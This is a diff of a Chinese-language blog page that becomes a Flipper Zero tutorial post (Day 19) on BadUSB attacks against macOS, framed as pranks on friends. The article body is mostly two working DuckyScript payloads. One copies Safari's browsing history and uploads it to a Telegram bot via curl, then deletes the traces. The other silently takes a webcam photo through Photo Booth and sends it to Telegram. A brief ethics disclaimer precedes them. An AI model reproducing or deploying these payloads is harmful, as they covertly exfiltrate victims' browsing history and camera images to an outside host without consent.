@@ -13,21 +13,28 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/tags/toy/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/10/04/flipper-zero-宇宙最強攻略：30-天帶你從入門到入坑-day19-1、2、3、笑一個！用-badusb-捕捉你朋友燦爛的笑容！/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="kazma&#39;s blog">
-<meta property="og:url" content="https://kazma.tw/tags/toy/index.html">
+        <meta name="description" content="前言昨天的文章發出去之後就問問戰隊的人有沒有什麼有趣的 BadUSB 應用，於是就有了以下的對話：於是今天會優先來嘗試這些有趣的功能，我們趕緊開始吧。 資安倫理宣導請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。 Browser Histor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！">
+<meta property="og:url" content="https://kazma.tw/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day19-1%E3%80%812%E3%80%813%E3%80%81%E7%AC%91%E4%B8%80%E5%80%8B%EF%BC%81%E7%94%A8-BadUSB-%E6%8D%95%E6%8D%89%E4%BD%A0%E6%9C%8B%E5%8F%8B%E7%87%A6%E7%88%9B%E7%9A%84%E7%AC%91%E5%AE%B9%EF%BC%81/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:description" content="前言昨天的文章發出去之後就問問戰隊的人有沒有什麼有趣的 BadUSB 應用，於是就有了以下的對話：於是今天會優先來嘗試這些有趣的功能，我們趕緊開始吧。 資安倫理宣導請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。 Browser Histor">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kazma.tw/images/dc_badusb.png">
+<meta property="og:image" content="https://kazma.tw/images/safari_history.png">
+<meta property="article:published_time" content="2024-10-03T16:01:46.526Z">
+<meta property="article:modified_time" content="2024-10-04T13:53:02.693Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+<meta property="article:tag" content="flipper-zero">
+<meta property="article:tag" content="iThome">
+<meta property="article:tag" content="toy">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/dc_badusb.png">
     
     
     <!--- Icon Part-->
@@ -39,7 +46,7 @@
     
     <title>
         
-            Tag: toy -
+            Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！ -
         
         kazma&#39;s blog
     </title>
@@ -354,7 +361,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/tags"
                                         >
                                     <i class="fa-solid fa-tags fa-fw"></i>
@@ -486,7 +493,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/tags"
                         >
                             <span>
@@ -618,145 +625,277 @@
             <div class="main-content">
 
                 
-                    <div class="tag-container">
-	<div class="tag-name">
-		<i class="fa-solid fa-tag"></i>&nbsp;toy
-	</div>
-	<div class="tag-post-list">
-		
-<div class="archive-list-container">
-    
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2024</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">10</span>
-            </div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
             
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
-                
-                    
-                    
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-04'>
-                    
-                    <a href="/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day20-%E6%8E%A7%E5%88%B6%E8%88%87%E5%89%B5%E9%80%A0%EF%BC%9AFlipper-Zero-GPIO-%E5%B8%B6%E4%BE%86%E7%9A%84%E7%84%A1%E9%99%90%E9%A0%98%E5%9F%9F/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day20 - 控制與創造：Flipper Zero GPIO 帶來的無限領域</span>
-                    </a>
-                    
-                
-                    
-                    
-                    <a href="/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day19-1%E3%80%812%E3%80%813%E3%80%81%E7%AC%91%E4%B8%80%E5%80%8B%EF%BC%81%E7%94%A8-BadUSB-%E6%8D%95%E6%8D%89%E4%BD%A0%E6%9C%8B%E5%8F%8B%E7%87%A6%E7%88%9B%E7%9A%84%E7%AC%91%E5%AE%B9%EF%BC%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！</span>
-                    </a>
-                    
-                
-                    
-                    
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
                         
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-02'>
-                    
-                    <a href="/2024/10/02/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day18-%E7%A5%9E%E9%9A%B1%E5%B0%91%E5%B9%B4%EF%BC%9A%E6%82%84%E7%84%A1%E8%81%B2%E6%81%AF%E7%9A%84%E9%80%8F%E9%81%8E-BadUSB-%E9%81%A0%E7%AB%AF%E6%88%AA%E5%9C%96%E8%87%B3%E4%BD%A0%E7%9A%84-TG-BOT%EF%BC%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day18 - 神隱少年：悄無聲息的透過 BadUSB 遠端截圖至你的 TG BOT！</span>
-                    </a>
-                    
-                
-                    
-                    
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
                         
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-01'>
-                    
-                    <a href="/2024/10/01/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day17-Flipper-Zero-%E3%81%AE%E9%81%A0%E7%A8%8B%E6%94%BB%E6%93%8A%EF%BC%9ABad-Bluetooth-%E7%84%A1%E7%B7%9A%E6%8E%A7%E5%88%B6%E8%A1%93/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day17 - Flipper Zero の遠程攻擊：Bad Bluetooth 無線控制術</span>
-                    </a>
-                    
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-04 00:01:46</span>
+        <span class="mobile">2024-10-04 00:01:46</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-04 21:53:02</span>
+            <span class="mobile">2024-10-04 21:53:02</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
                 
-                    
-                    
-                    <a href="/2024/10/01/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day16-%E8%BD%89%E6%94%BB%E7%82%BA%E5%AE%88%EF%BC%81Flipper-Zero-U2F-%E7%82%BA%E4%BD%A0%E7%AF%89%E4%B8%8B%E5%A0%85%E4%B8%8D%E5%8F%AF%E6%91%A7%E7%9A%84%E9%8A%85%E7%89%86%E9%90%B5%E5%A3%81%EF%BC%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day16 - 轉攻為守！Flipper Zero U2F 為你築下堅不可摧的銅牆鐵壁！</span>
-                    </a>
-                    
+                    <li>
+                        <a href="/tags/flipper-zero/">flipper-zero</a>&nbsp;
+                    </li>
                 
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-30'>
-                    
-                    <a href="/2024/09/30/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day15-%E4%BB%8A%E5%A4%A9%E8%A6%81%E4%BB%8B%E7%B4%B9%E7%9A%84%E4%B8%8D%E6%98%AF-iPhone%EF%BC%8C%E4%B9%9F%E4%B8%8D%E6%98%AF-iPad%EF%BC%8C%E8%80%8C%E6%98%AF-iButton%EF%BC%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day15 - 今天要介紹的不是 iPhone，也不是 iPad，而是 iButton！</span>
-                    </a>
-                    
+                    <li>
+                        | <a href="/tags/iThome/">iThome</a>&nbsp;
+                    </li>
                 
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-28'>
-                    
-                    <a href="/2024/09/28/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day14-%E7%94%A8-Flipper-Zero-Infrared-%E6%88%90%E7%82%BA%E7%84%A1%E6%89%80%E4%B8%8D%E8%83%BD%E7%9A%84%E6%B2%99%E7%99%BC%E9%A6%AC%E9%88%B4%E8%96%AF%E6%8C%87%E6%8F%AE%E5%AE%B6/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day14 - 用 Flipper Zero Infrared 成為無所不能的沙發馬鈴薯指揮家</span>
-                    </a>
-                    
+                    <li>
+                        | <a href="/tags/toy/">toy</a>&nbsp;
+                    </li>
                 
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-27'>
-                    
-                    <a href="/2024/09/27/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day13-%E5%88%B7%E4%B8%80%E4%B8%8B%E5%B0%B1%E6%90%9E%E5%AE%9A%EF%BC%81NFC-Maker-%E8%AE%93%E7%94%9F%E6%B4%BB%E8%AE%8A%E5%BE%97%E6%9B%B4%E7%B0%A1%E5%96%AE%EF%BC%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day13 - 刷一下就搞定！NFC Maker 讓生活變得更簡單！</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-26'>
-                    
-                    <a href="/2024/09/26/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day12-%E4%BB%80%E9%BA%BC%EF%BC%81%EF%BC%9F%E9%80%A3-NFC-%E9%83%BD%E5%8F%AF%E4%BB%A5-RickRoll-%E4%BD%A0%E9%9A%94%E5%A3%81%E7%9A%84%E5%90%8C%E5%AD%B8%EF%BC%81%EF%BC%9F/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day12 - 什麼！？連 NFC 都可以 RickRoll 你隔壁的同學！？</span>
-                    </a>
-                    
-                
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-25'>
-                    
-                    <a href="/2024/09/25/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day11-%E8%AA%B0%E8%AA%AA%E8%A6%81%E5%8D%A1%E6%89%8D%E8%83%BD%E9%80%B2%EF%BC%9FMFKey32-%E6%94%BB%E6%93%8A%E8%AE%93%E4%BD%A0%E7%84%A1%E5%8D%A1%E4%B9%9F%E8%83%BD%E7%A0%B4%E8%A7%A3%E9%96%80%E7%A6%81/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day11 - 誰說要卡才能進？MFKey32 攻擊讓你無卡也能破解門禁!</span>
-                    </a>
-                    
-                
-                </li> <!-- Ensure the last item is properly closed -->
             </ul>
-        </section>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-	</div>
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天的文章發出去之後就問問戰隊的人有沒有什麼有趣的 BadUSB 應用，於是就有了以下的對話：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/dc_badusb.png"
+                      alt="dc"
+                ><br>於是今天會優先來嘗試這些有趣的功能，我們趕緊開始吧。</p>
+<h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p>
+<h2 id="Browser-History"><a href="#Browser-History" class="headerlink" title="Browser History"></a>Browser History</h2><p>首先我們先來嘗試瀏覽紀錄，因為我跟身邊的朋友都比較常用 Mac 所以今天也會先以研究 Mac 為主。<br>首先我們先去找預設瀏覽器 Safari 的瀏覽紀錄放在哪裡，經過搜尋後發現在 <code>/Users/$username/Library/Safari/History.db</code>，我們把它複製到 <code>/tmp/history.db</code> 方便我們執行後續操作，然後用 sqlite3 執行 <code>select url from history_items</code> 到一個新的 txt，接著我們就把它傳給我們的 tg bot 然後刪除所有痕跡之後用 command + q 關掉 terminal。<br>結果在測試的時候發現我的 terminal 權限不夠會發生以下的錯誤：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ sqlite3 ~/Library/Safari/History.db &quot;SELECT url FROM history_visits JOIN history_items ON history_items.id = history_visits.history_item ORDER BY visit_time DESC LIMIT 10;&quot;</span><br><span class="line">Error: unable to open database &quot;/Users/kingkazma/Library/Safari/History.db&quot;: unable to open database file</span><br></pre></td></tr></table></figure></div>
+<p>但是我的 iTerm 因為時常在執行怪怪的事情所以那邊反而是可以執行的，所以這邊改成開 iTerm 來執行腳本，腳本如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING iterm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line">GUI T</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Define the username and copy the Safari history to a temporary file</span><br><span class="line">STRING export username=$(whoami)</span><br><span class="line">ENTER</span><br><span class="line">STRING cp /Users/$username/Library/Safari/History.db /tmp/history.db</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Export history from the database to a plain text file</span><br><span class="line">STRING sqlite3 /tmp/history.db &quot;select url from history_items&quot; &gt; /Users/$username/Desktop/safari_history.txt</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Send the history file to Telegram</span><br><span class="line">STRING curl -s -X POST -F &quot;chat_id=&lt;your_chat_id&gt;&quot; -F document=@&quot;/Users/$username/Desktop/safari_history.txt&quot; https://api.telegram.org/bot&lt;your_token&gt;/sendDocument</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Clean up temporary files</span><br><span class="line">STRING rm /tmp/history.db</span><br><span class="line">ENTER</span><br><span class="line">STRING rm /Users/$username/Desktop/safari_history.txt</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Close Terminal</span><br><span class="line">DELAY 5000</span><br><span class="line">GUI Q</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div>
+<p>然後我都習慣打開終端或是瀏覽器之後開一個新分頁是因為有時候受害者的應用程式已經打開的話腳本就有機會出錯，所以儘量讓這些參數都一樣成功率比較高，執行結果：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/safari_history.png"
+                      alt="history"
+                ><br>成功收到瀏覽紀錄了。</p>
+<h2 id="Camera"><a href="#Camera" class="headerlink" title="Camera"></a>Camera</h2><p>接著想要嘗試幫受害者照張相行不行得通，首先研究蘋果用終端拍照的方是主要有兩種，一種是透過內建的 AppleScript 對 Photo Booth 操作，另外一種是透過 brew 下載 imagesnap，但要下載就會有比較難估計的等待時間，所以這邊嘗試用內建功能來完成。<br>研究了之後發現 photo booth 是可以透過 enter 來觸發快門的，所以我們的腳本最後寫完如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">REM Type &#x27;iTerm&#x27; to open iTerm</span><br><span class="line">STRING iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line">GUI T</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Use AppleScript to activate Photo Booth and take a photo</span><br><span class="line">STRING osascript -e &#x27;tell application &quot;Photo Booth&quot; to activate&#x27; -e &#x27;delay 2&#x27; -e &#x27;tell application &quot;System Events&quot; to keystroke return&#x27; -e &#x27;delay 2&#x27;</span><br><span class="line">ENTER</span><br><span class="line">DELAY 3500  REM Wait for Photo Booth to take the photo and save it</span><br><span class="line"></span><br><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">REM Type &#x27;iTerm&#x27; to open iTerm</span><br><span class="line">STRING iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Find the most recent Photo Booth photo</span><br><span class="line">STRING cd ~/Pictures/Photo\ Booth\ Library/Pictures/</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING latest_photo=$(ls -t | head -n1)</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Send the photo to the Telegram bot</span><br><span class="line">STRING curl -s -X POST -F chat_id=&lt;your_chat_id&gt; -F photo=@\&quot;$latest_photo\&quot; https://api.telegram.org/bot&lt;your_token&gt;/sendPhoto</span><br><span class="line">ENTER</span><br><span class="line">DELAY 5000</span><br><span class="line"></span><br><span class="line">REM Optionally, close Photo Booth if you want to clean up after the action</span><br><span class="line">STRING osascript -e &#x27;tell application &quot;Photo Booth&quot; to quit&#x27;</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Close iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">GUI Q</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div>
+<p>執行成功，各位就回去自己試試吧，這邊不放我的醜照了w</p>
+<h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>BadUSB 的介紹就差不多到這邊，大家要注意的是很多我們測試的功能都不是預設終端會有的，所以大家不要想做壞壞的是R，那各位就明天見了，88。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-10-04 00:01:46</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-10-04 21:53:02
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/10/04/Flipper-Zero-宇宙最強攻略：30-天帶你從入門到入坑-Day19-1、2、3、笑一個！用-BadUSB-捕捉你朋友燦爛的笑容！/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
 </div>
 
-<div class="tag-paginator">
-	<div class="paginator">
-    <span class="page-number current">1</span><a class="page-number" href="/tags/toy/page/2/">2</a><a class="extend next" rel="next" href="/tags/toy/page/2/"><i class="fa-regular fa-angle-right"></i></a>
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/flipper-zero/">#flipper-zero</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/iThome/">#iThome</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/toy/">#toy</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day20-%E6%8E%A7%E5%88%B6%E8%88%87%E5%89%B5%E9%80%A0%EF%BC%9AFlipper-Zero-GPIO-%E5%B8%B6%E4%BE%86%E7%9A%84%E7%84%A1%E9%99%90%E9%A0%98%E5%9F%9F/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
